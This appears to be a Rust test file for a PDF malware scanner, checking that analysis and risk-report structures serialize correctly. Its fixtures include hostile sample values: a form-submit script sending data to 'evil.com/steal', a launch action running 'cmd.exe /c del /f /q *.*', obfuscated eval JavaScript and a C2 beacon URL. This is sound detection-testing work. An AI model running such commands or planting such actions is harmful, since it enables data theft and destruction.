#![allow(
    clippy::case_sensitive_file_extension_comparisons,
    clippy::cast_possible_truncation,
    clippy::cast_possible_wrap,
    clippy::cast_precision_loss,
    clippy::cast_sign_loss,
    clippy::collection_is_never_read,
    clippy::field_reassign_with_default,
    clippy::format_push_string,
    clippy::float_cmp,
    clippy::if_not_else,
    clippy::ignore_without_reason,
    clippy::items_after_statements,
    clippy::iter_on_single_items,
    clippy::large_futures,
    clippy::large_stack_arrays,
    clippy::large_stack_frames,
    clippy::manual_assert_eq,
    clippy::manual_let_else,
    clippy::match_same_arms,
    clippy::match_wildcard_for_single_variants,
    clippy::needless_collect,
    clippy::needless_pass_by_ref_mut,
    clippy::needless_pass_by_value,
    clippy::no_effect_underscore_binding,
    clippy::option_if_let_else,
    clippy::ref_option,
    clippy::redundant_clone,
    clippy::redundant_pattern_matching,
    clippy::self_only_used_in_recursion,
    clippy::significant_drop_tightening,
    clippy::single_match_else,
    clippy::single_option_map,
    clippy::too_many_lines,
    clippy::trivially_copy_pass_by_ref,
    clippy::unnecessary_debug_formatting,
    clippy::unreadable_literal,
    clippy::unused_async,
    clippy::unused_self,
    clippy::used_underscore_binding,
    clippy::useless_let_if_seq,
    clippy::wildcard_enum_match_arm,
    clippy::ignored_unit_patterns
)]

use file_scanner::pdf_analysis::*;
use std::collections::HashMap;
use std::io::Write;
use tempfile::NamedTempFile;

#[test]
fn test_pdf_document_info_serialization() {
    let info = PdfDocumentInfo {
        version: "1.7".to_string(),
        page_count: 25,
        file_size: 2_048_576,
        producer: Some("Adobe Acrobat Pro".to_string()),
        creator: Some("Microsoft Word".to_string()),
        creation_date: Some("2024-01-15T10:30:00Z".to_string()),
        modification_date: Some("2024-01-20T15:45:00Z".to_string()),
        is_linearized: true,
        is_encrypted: true,
        is_signed: true,
    };

    let json = serde_json::to_string(&info).unwrap();
    let deserialized: PdfDocumentInfo = serde_json::from_str(&json).unwrap();

    assert_eq!(info.version, deserialized.version);
    assert_eq!(info.page_count, deserialized.page_count);
    assert_eq!(info.file_size, deserialized.file_size);
    assert_eq!(info.producer, deserialized.producer);
    assert_eq!(info.creator, deserialized.creator);
    assert_eq!(info.creation_date, deserialized.creation_date);
    assert_eq!(info.modification_date, deserialized.modification_date);
    assert_eq!(info.is_linearized, deserialized.is_linearized);
    assert_eq!(info.is_encrypted, deserialized.is_encrypted);
    assert_eq!(info.is_signed, deserialized.is_signed);
}

#[test]
fn test_pdf_structure_comprehensive() {
    let structure = PdfStructure {
        pages: vec![
            PdfPageInfo {
                page_number: 1,
                width: 612.0,
                height: 792.0,
                rotation: 0,
                has_javascript: true,
                has_forms: true,
                has_annotations: true,
                embedded_files: vec!["attachment.txt".to_string()],
                resource_types: vec!["Font".to_string(), "Image".to_string()],
            },
            PdfPageInfo {
                page_number: 2,
                width: 612.0,
                height: 792.0,
                rotation: 90,
                has_javascript: false,
                has_forms: false,
                has_annotations: false,
                embedded_files: vec![],
                resource_types: vec!["Font".to_string()],
            },
        ],
        xref_count: 150,
        object_count: 120,
        stream_count: 45,
        catalog_info: CatalogInfo {
            page_layout: Some("TwoPageLeft".to_string()),
            page_mode: Some("UseOutlines".to_string()),
            viewer_preferences: {
                let mut prefs = HashMap::new();
                prefs.insert("HideToolbar".to_string(), "true".to_string());
                prefs.insert("FitWindow".to_string(), "false".to_string());
                prefs
            },
            has_acroform: true,
            has_javascript: true,
            has_embedded_files: true,
            has_open_action: true,
            open_action_type: Some("JavaScript".to_string()),
        },
        object_streams: vec![ObjectStreamInfo {
            object_id: 10,
            stream_type: "Content".to_string(),
            size: 4096,
            filter: Some("FlateDecode".to_string()),
            is_compressed: true,
        }],
    };

    let json = serde_json::to_string(&structure).unwrap();
    let deserialized: PdfStructure = serde_json::from_str(&json).unwrap();

    assert_eq!(structure.pages.len(), deserialized.pages.len());
    assert_eq!(structure.xref_count, deserialized.xref_count);
    assert_eq!(structure.object_count, deserialized.object_count);
    assert_eq!(structure.stream_count, deserialized.stream_count);
    assert_eq!(
        structure.catalog_info.has_javascript,
        deserialized.catalog_info.has_javascript
    );
    assert_eq!(
        structure.catalog_info.has_open_action,
        deserialized.catalog_info.has_open_action
    );
}

#[test]
fn test_pdf_security_features() {
    let security = PdfSecurity {
        encryption: Some(EncryptionInfo {
            algorithm: "AES-256".to_string(),
            key_length: 256,
            revision: 6,
            is_owner_password_set: true,
            is_user_password_set: true,
        }),
        permissions: PdfPermissions {
            can_print: true,
            can_modify: false,
            can_copy: false,
            can_annotate: true,
            can_fill_forms: true,
            can_extract: false,
            can_assemble: false,
            print_quality: "HighQuality".to_string(),
        },
        digital_signatures: vec![DigitalSignatureInfo {
            signer_name: Some("John Doe".to_string()),
            sign_date: Some("2024-01-25T12:00:00Z".to_string()),
            reason: Some("Document approval".to_string()),
            location: Some("New York, NY".to_string()),
            is_valid: true,
            certificate_info: Some(CertificateInfo {
                subject: "CN=John Doe, O=ACME Corp".to_string(),
                issuer: "CN=ACME CA, O=ACME Corp".to_string(),
                serial_number: "1234567890ABCDEF".to_string(),
                not_before: "2023-01-01T00:00:00Z".to_string(),
                not_after: "2025-01-01T00:00:00Z".to_string(),
            }),
        }],
        security_handler: Some("Standard".to_string()),
    };

    let json = serde_json::to_string(&security).unwrap();
    let deserialized: PdfSecurity = serde_json::from_str(&json).unwrap();

    assert!(deserialized.encryption.is_some());
    let enc = deserialized.encryption.unwrap();
    assert_eq!(enc.algorithm, "AES-256");
    assert_eq!(enc.key_length, 256);
    assert!(enc.is_owner_password_set);
    assert!(enc.is_user_password_set);

    assert!(!deserialized.permissions.can_modify);
    assert!(!deserialized.permissions.can_copy);
    assert!(deserialized.permissions.can_print);
    assert_eq!(deserialized.digital_signatures.len(), 1);
}

#[test]
fn test_pdf_content_analysis_comprehensive() {
    let content = PdfContentAnalysis {
        javascript: vec![
            JavaScriptInfo {
                location: "Page 1 OpenAction".to_string(),
                code_preview: "app.alert('Welcome!');".to_string(),
                length: 22,
                obfuscation_score: 0.1,
                suspicious_patterns: vec![],
            },
            JavaScriptInfo {
                location: "Form Field Submit".to_string(),
                code_preview: "this.submitForm({cURL: 'http://evil.com/steal'})".to_string(),
                length: 48,
                obfuscation_score: 0.8,
                suspicious_patterns: vec![
                    "External URL submission".to_string(),
                    "Suspicious domain".to_string(),
                ],
            },
        ],
        embedded_files: vec![
            EmbeddedFileInfo {
                filename: "payload.exe".to_string(),
                mime_type: Some("application/x-msdownload".to_string()),
                size: 102400,
                creation_date: Some("2024-01-20T10:00:00Z".to_string()),
                modification_date: Some("2024-01-20T10:00:00Z".to_string()),
                checksum: Some("d41d8cd98f00b204e9800998ecf8427e".to_string()),
            },
            EmbeddedFileInfo {
                filename: "readme.txt".to_string(),
                mime_type: Some("text/plain".to_string()),
                size: 1024,
                creation_date: None,
                modification_date: None,
                checksum: None,
            },
        ],
        forms: vec![
            FormInfo {
                field_name: "username".to_string(),
                field_type: "Text".to_string(),
                has_javascript: false,
                submit_url: Some("https://legitimate.com/submit".to_string()),
                is_hidden: false,
            },
            FormInfo {
                field_name: "hidden_field".to_string(),
                field_type: "Text".to_string(),
                has_javascript: true,
                submit_url: Some("http://suspicious.site/collect".to_string()),
                is_hidden: true,
            },
        ],
        actions: vec![
            ActionInfo {
                action_type: "JavaScript".to_string(),
                trigger: "MouseDown".to_string(),
                target: Some("Button1".to_string()),
                javascript_code: Some("executePayload()".to_string()),
                risk_level: RiskLevel::High,
            },
            ActionInfo {
                action_type: "Launch".to_string(),
                trigger: "PageOpen".to_string(),
                target: Some("cmd.exe".to_string()),
                javascript_code: None,
                risk_level: RiskLevel::Critical,
            },
        ],
        urls: vec![
            "https://legitimate.com".to_string(),
            "http://evil.com/malware".to_string(),
            "ftp://files.example.com".to_string(),
        ],
        launch_actions: vec![LaunchActionInfo {
            target_application: "cmd.exe".to_string(),
            parameters: vec!["/c".to_string(), "del /f /q *.*".to_string()],
            location: "Page 5 Annotation".to_string(),
            risk_level: RiskLevel::Critical,
        }],
        suspicious_names: vec![
            "/AA".to_string(),
            "/OpenAction".to_string(),
            "/JS".to_string(),
        ],
        redirection_chains: vec![RedirectionInfo {
            source: "https://short.url/abc".to_string(),
            destination: "http://malicious.site/payload".to_string(),
            redirect_type: "HTTP 302".to_string(),
        }],
    };

    let json = serde_json::to_string(&content).unwrap();
    let deserialized: PdfContentAnalysis = serde_json::from_str(&json).unwrap();

    assert_eq!(deserialized.javascript.len(), 2);
    assert_eq!(deserialized.embedded_files.len(), 2);
    assert_eq!(deserialized.forms.len(), 2);
    assert_eq!(deserialized.actions.len(), 2);
    assert_eq!(deserialized.urls.len(), 3);
    assert_eq!(deserialized.launch_actions.len(), 1);
    assert_eq!(deserialized.suspicious_names.len(), 3);
    assert_eq!(deserialized.redirection_chains.len(), 1);

    // Verify high-risk elements
    assert_eq!(deserialized.javascript[1].suspicious_patterns.len(), 2);
    assert!(deserialized.forms[1].is_hidden);
    assert!(matches!(
        deserialized.actions[1].risk_level,
        RiskLevel::Critical
    ));
}

#[test]
fn test_pdf_suspicious_indicators() {
    let indicators = PdfSuspiciousIndicators {
        has_javascript: true,
        has_embedded_files: true,
        has_launch_actions: true,
        has_suspicious_names: true,
        has_auto_actions: true,
        javascript_count: 5,
        embedded_file_count: 2,
        form_count: 3,
        suspicious_patterns: vec![
            SuspiciousPattern {
                pattern_type: "ObfuscatedJavaScript".to_string(),
                description: "Heavily obfuscated JavaScript code detected".to_string(),
                location: "Document-level script".to_string(),
                confidence: 0.9,
            },
            SuspiciousPattern {
                pattern_type: "SuspiciousURL".to_string(),
                description: "URL points to known malicious domain".to_string(),
                location: "Form submission action".to_string(),
                confidence: 0.95,
            },
        ],
        exploitation_vectors: vec![
            ExploitationVector {
                vector_type: "LaunchAction".to_string(),
                description: "Can execute arbitrary commands via launch action".to_string(),
                cve_references: vec!["CVE-2010-1240".to_string()],
                risk_level: RiskLevel::Critical,
            },
            ExploitationVector {
                vector_type: "JavaScriptExecution".to_string(),
                description: "JavaScript code execution in PDF reader".to_string(),
                cve_references: vec!["CVE-2013-3346".to_string(), "CVE-2014-0521".to_string()],
                risk_level: RiskLevel::High,
            },
        ],
        risk_score: 85,
    };

    let json = serde_json::to_string(&indicators).unwrap();
    let deserialized: PdfSuspiciousIndicators = serde_json::from_str(&json).unwrap();

    assert!(deserialized.has_javascript);
    assert!(deserialized.has_embedded_files);
    assert!(deserialized.has_launch_actions);
    assert!(deserialized.has_suspicious_names);
    assert!(deserialized.has_auto_actions);
    assert_eq!(deserialized.javascript_count, 5);
    assert_eq!(deserialized.embedded_file_count, 2);
    assert_eq!(deserialized.form_count, 3);
    assert_eq!(deserialized.suspicious_patterns.len(), 2);
    assert_eq!(deserialized.exploitation_vectors.len(), 2);
    assert_eq!(deserialized.risk_score, 85);
}

#[test]
fn test_pdf_metadata_comprehensive() {
    let mut custom_props = HashMap::new();
    custom_props.insert("Company".to_string(), "ACME Corp".to_string());
    custom_props.insert("Department".to_string(), "Security".to_string());
    custom_props.insert("DocumentID".to_string(), "SEC-2024-001".to_string());

    let metadata = PdfMetadata {
        title: Some("Quarterly Security Report".to_string()),
        author: Some("Jane Smith".to_string()),
        subject: Some("Security Analysis Q1 2024".to_string()),
        keywords: Some("security, malware, threats, Q1".to_string()),
        creator: Some("Microsoft Word 2021".to_string()),
        producer: Some("Adobe PDF Library 15.0".to_string()),
        creation_date: Some("2024-01-01T09:00:00Z".to_string()),
        modification_date: Some("2024-01-25T16:30:00Z".to_string()),
        trapped: Some("False".to_string()),
        custom_properties: custom_props,
    };

    let json = serde_json::to_string(&metadata).unwrap();
    let deserialized: PdfMetadata = serde_json::from_str(&json).unwrap();

    assert_eq!(metadata.title, deserialized.title);
    assert_eq!(metadata.author, deserialized.author);
    assert_eq!(metadata.subject, deserialized.subject);
    assert_eq!(metadata.keywords, deserialized.keywords);
    assert_eq!(metadata.creator, deserialized.creator);
    assert_eq!(metadata.producer, deserialized.producer);
    assert_eq!(metadata.creation_date, deserialized.creation_date);
    assert_eq!(metadata.modification_date, deserialized.modification_date);
    assert_eq!(metadata.trapped, deserialized.trapped);
    assert_eq!(
        metadata.custom_properties.len(),
        deserialized.custom_properties.len()
    );
}

#[test]
fn test_pdf_risk_assessment() {
    let assessment = PdfRiskAssessment {
        overall_risk: RiskLevel::Critical,
        risk_factors: vec![
            RiskFactor {
                factor_type: "JavaScript".to_string(),
                description: "Multiple obfuscated JavaScript instances detected".to_string(),
                severity: RiskLevel::High,
                mitigation: "Disable JavaScript execution in PDF reader".to_string(),
            },
            RiskFactor {
                factor_type: "LaunchAction".to_string(),
                description: "Document can execute external programs".to_string(),
                severity: RiskLevel::Critical,
                mitigation: "Open only in sandboxed environment".to_string(),
            },
            RiskFactor {
                factor_type: "EmbeddedExecutable".to_string(),
                description: "Contains embedded executable file".to_string(),
                severity: RiskLevel::Critical,
                mitigation: "Do not extract or execute embedded files".to_string(),
            },
        ],
        recommendations: vec![
            "Do not open this file outside a sandbox".to_string(),
            "Disable all active content in PDF reader".to_string(),
            "Scan with updated antivirus before opening".to_string(),
            "Consider this file highly suspicious".to_string(),
        ],
        ioc_indicators: vec![
            IocIndicator {
                indicator_type: "URL".to_string(),
                value: "http://malicious.site/payload".to_string(),
                context: "Found in form submission URL".to_string(),
                confidence: 0.95,
            },
            IocIndicator {
                indicator_type: "Filename".to_string(),
                value: "payload.exe".to_string(),
                context: "Embedded file with suspicious name".to_string(),
                confidence: 0.9,
            },
            IocIndicator {
                indicator_type: "JavaScript".to_string(),
                value: "eval(unescape(".to_string(),
                context: "Obfuscation pattern in JavaScript".to_string(),
                confidence: 0.85,
            },
        ],
    };

    let json = serde_json::to_string(&assessment).unwrap();
    let deserialized: PdfRiskAssessment = serde_json::from_str(&json).unwrap();

    assert!(matches!(deserialized.overall_risk, RiskLevel::Critical));
    assert_eq!(deserialized.risk_factors.len(), 3);
    assert_eq!(deserialized.recommendations.len(), 4);
    assert_eq!(deserialized.ioc_indicators.len(), 3);
}

#[test]
fn test_complete_pdf_analysis() {
    let analysis = PdfAnalysis {
        document_info: PdfDocumentInfo {
            version: "1.7".to_string(),
            page_count: 15,
            file_size: 5_242_880,
            producer: Some("Suspicious PDF Creator".to_string()),
            creator: Some("Unknown".to_string()),
            creation_date: Some("2024-01-20T00:00:00Z".to_string()),
            modification_date: Some("2024-01-21T00:00:00Z".to_string()),
            is_linearized: false,
            is_encrypted: false,
            is_signed: false,
        },
        structure: PdfStructure {
            pages: vec![PdfPageInfo {
                page_number: 1,
                width: 612.0,
                height: 792.0,
                rotation: 0,
                has_javascript: true,
                has_forms: true,
                has_annotations: true,
                embedded_files: vec!["malware.exe".to_string()],
                resource_types: vec!["Font".to_string(), "JavaScript".to_string()],
            }],
            xref_count: 200,
            object_count: 150,
            stream_count: 50,
            catalog_info: CatalogInfo {
                page_layout: None,
                page_mode: None,
                viewer_preferences: HashMap::new(),
                has_acroform: true,
                has_javascript: true,
                has_embedded_files: true,
                has_open_action: true,
                open_action_type: Some("JavaScript".to_string()),
            },
            object_streams: vec![],
        },
        security: PdfSecurity {
            encryption: None,
            permissions: PdfPermissions::default(),
            digital_signatures: vec![],
            security_handler: None,
        },
        content_analysis: PdfContentAnalysis {
            javascript: vec![JavaScriptInfo {
                location: "Document OpenAction".to_string(),
                code_preview: "eval(unescape('%65%76%61%6C'))".to_string(),
                length: 30,
                obfuscation_score: 0.95,
                suspicious_patterns: vec![
                    "eval usage".to_string(),
                    "unescape obfuscation".to_string(),
                ],
            }],
            embedded_files: vec![EmbeddedFileInfo {
                filename: "malware.exe".to_string(),
                mime_type: Some("application/x-msdownload".to_string()),
                size: 524288,
                creation_date: None,
                modification_date: None,
                checksum: Some("abc123def456".to_string()),
            }],
            forms: vec![],
            actions: vec![],
            urls: vec!["http://command-control.evil/beacon".to_string()],
            launch_actions: vec![],
            suspicious_names: vec!["/JS".to_string(), "/OpenAction".to_string()],
            redirection_chains: vec![],
        },
        suspicious_indicators: PdfSuspiciousIndicators {
            has_javascript: true,
            has_embedded_files: true,
            has_launch_actions: false,
            has_suspicious_names: true,
            has_auto_actions: true,
            javascript_count: 1,
            embedded_file_count: 1,
            form_count: 0,
            suspicious_patterns: vec![SuspiciousPattern {
                pattern_type: "MaliciousJavaScript".to_string(),
                description: "Obfuscated JavaScript with eval".to_string(),
                location: "Document level".to_string(),
                confidence: 0.95,
            }],
            exploitation_vectors: vec![],
            risk_score: 90,
        },
        metadata: PdfMetadata {
            title: None,
            author: Some("hacker123".to_string()),
            subject: None,
            keywords: None,
            creator: Some("Malicious PDF Builder".to_string()),
            producer: None,
            creation_date: Some("2024-01-20T00:00:00Z".to_string()),
            modification_date: None,
            trapped: None,
            custom_properties: HashMap::new(),
        },
        risk_assessment: PdfRiskAssessment {
            overall_risk: RiskLevel::Critical,
            risk_factors: vec![
                RiskFactor {
                    factor_type: "MaliciousJavaScript".to_string(),
                    description: "Highly obfuscated JavaScript detected".to_string(),
                    severity: RiskLevel::Critical,
                    mitigation: "Do not open this file".to_string(),
                },
                RiskFactor {
                    factor_type: "EmbeddedMalware".to_string(),
                    description: "Embedded executable file detected".to_string(),
                    severity: RiskLevel::Critical,
                    mitigation: "Quarantine immediately".to_string(),
                },
            ],
            recommendations: vec![
                "This file appears to be malicious".to_string(),
                "Quarantine and delete immediately".to_string(),
                "Report to security team".to_string(),
            ],
            ioc_indicators: vec![
                IocIndicator {
                    indicator_type: "URL".to_string(),
                    value: "http://command-control.evil/beacon".to_string(),
                    context: "C2 server URL found in JavaScript".to_string(),
                    confidence: 0.98,
                },
                IocIndicator {
                    indicator_type: "File".to_string(),
                    value: "malware.exe".to_string(),
                    context: "Embedded malicious executable".to_string(),
                    confidence: 0.99,
                },
            ],
        },
    };

    // Test full serialization
    let json = serde_json::to_string(&analysis).unwrap();
    let deserialized: PdfAnalysis = serde_json::from_str(&json).unwrap();

    // Verify critical fields
    assert_eq!(
        deserialized.document_info.page_count,
        analysis.document_info.page_count
    );
    assert!(deserialized.structure.catalog_info.has_javascript);
    assert!(deserialized.suspicious_indicators.has_javascript);
    assert_eq!(deserialized.suspicious_indicators.risk_score, 90);
    assert!(matches!(
        deserialized.risk_assessment.overall_risk,
        RiskLevel::Critical
    ));
}

#[test]
fn test_risk_level_variants() {
    let risk_levels = vec![
        RiskLevel::Low,
        RiskLevel::Medium,
        RiskLevel::High,
        RiskLevel::Critical,
    ];

    for level in risk_levels {
        let json = serde_json::to_string(&level).unwrap();
        let deserialized: RiskLevel = serde_json::from_str(&json).unwrap();
        assert_eq!(format!("{level:?}"), format!("{:?}", deserialized));
    }
}

#[test]
fn test_pdf_analysis_edge_cases() {
    // Test with minimal data
    let minimal_analysis = PdfAnalysis {
        document_info: PdfDocumentInfo {
            version: "1.0".to_string(),
            page_count: 0,
            file_size: 0,
            producer: None,
            creator: None,
            creation_date: None,
            modification_date: None,
            is_linearized: false,
            is_encrypted: false,
            is_signed: false,
        },
        structure: PdfStructure {
            pages: vec![],
            xref_count: 0,
            object_count: 0,
            stream_count: 0,
            catalog_info: CatalogInfo {
                page_layout: None,
                page_mode: None,
                viewer_preferences: HashMap::new(),
                has_acroform: false,
                has_javascript: false,
                has_embedded_files: false,
                has_open_action: false,
                open_action_type: None,
            },
            object_streams: vec![],
        },
        security: PdfSecurity {
            encryption: None,
            permissions: PdfPermissions::default(),
            digital_signatures: vec![],
            security_handler: None,
        },
        content_analysis: PdfContentAnalysis {
            javascript: vec![],
            embedded_files: vec![],
            forms: vec![],
            actions: vec![],
            urls: vec![],
            launch_actions: vec![],
            suspicious_names: vec![],
            redirection_chains: vec![],
        },
        suspicious_indicators: PdfSuspiciousIndicators::default(),
        metadata: PdfMetadata::default(),
        risk_assessment: PdfRiskAssessment::default(),
    };

    let json = serde_json::to_string(&minimal_analysis).unwrap();
    let deserialized: PdfAnalysis = serde_json::from_str(&json).unwrap();

    assert_eq!(deserialized.document_info.page_count, 0);
    assert_eq!(deserialized.structure.pages.len(), 0);
    assert!(!deserialized.suspicious_indicators.has_javascript);
    assert_eq!(deserialized.suspicious_indicators.risk_score, 0);
}

#[test]
fn test_analyze_pdf_invalid_file() {
    // Test with non-PDF file
    let mut temp_file = NamedTempFile::new().unwrap();
    temp_file
        .write_all(b"This is definitely not a PDF file!")
        .unwrap();
    temp_file.flush().unwrap();

    let result = analyze_pdf(temp_file.path());
    assert!(result.is_err());
}

#[test]
fn test_analyze_pdf_empty_file() {
    // Test with empty file
    let temp_file = NamedTempFile::new().unwrap();

    let result = analyze_pdf(temp_file.path());
    assert!(result.is_err());
}

#[test]
fn test_pdf_permissions_default() {
    let perms = PdfPermissions::default();

    // All permissions should be false by default
    assert!(!perms.can_print);
    assert!(!perms.can_modify);
    assert!(!perms.can_copy);
    assert!(!perms.can_annotate);
    assert!(!perms.can_fill_forms);
    assert!(!perms.can_extract);
    assert!(!perms.can_assemble);
    assert!(perms.print_quality.is_empty());
}

#[test]
fn test_pdf_analysis_yaml_serialization() {
    let analysis = PdfAnalysis {
        document_info: PdfDocumentInfo {
            version: "1.5".to_string(),
            page_count: 5,
            file_size: 1024,
            producer: Some("Test".to_string()),
            creator: None,
            creation_date: None,
            modification_date: None,
            is_linearized: false,
            is_encrypted: false,
            is_signed: false,
        },
        structure: PdfStructure {
            pages: vec![],
            xref_count: 10,
            object_count: 5,
            stream_count: 2,
            catalog_info: CatalogInfo {
                page_layout: None,
                page_mode: None,
                viewer_preferences: HashMap::new(),
                has_acroform: false,
                has_javascript: true,
                has_embedded_files: false,
                has_open_action: false,
                open_action_type: None,
            },
            object_streams: vec![],
        },
        security: PdfSecurity {
            encryption: None,
            permissions: PdfPermissions::default(),
            digital_signatures: vec![],
            security_handler: None,
        },
        content_analysis: PdfContentAnalysis {
            javascript: vec![],
            embedded_files: vec![],
            forms: vec![],
            actions: vec![],
            urls: vec![],
            launch_actions: vec![],
            suspicious_names: vec![],
            redirection_chains: vec![],
        },
        suspicious_indicators: PdfSuspiciousIndicators {
            has_javascript: true,
            ..Default::default()
        },
        metadata: PdfMetadata::default(),
        risk_assessment: PdfRiskAssessment::default(),
    };

    let yaml = serde_yaml::to_string(&analysis).unwrap();
    assert!(yaml.contains("version"));
    assert!(yaml.contains("1.5"));
    assert!(yaml.contains("has_javascript: true"));
}
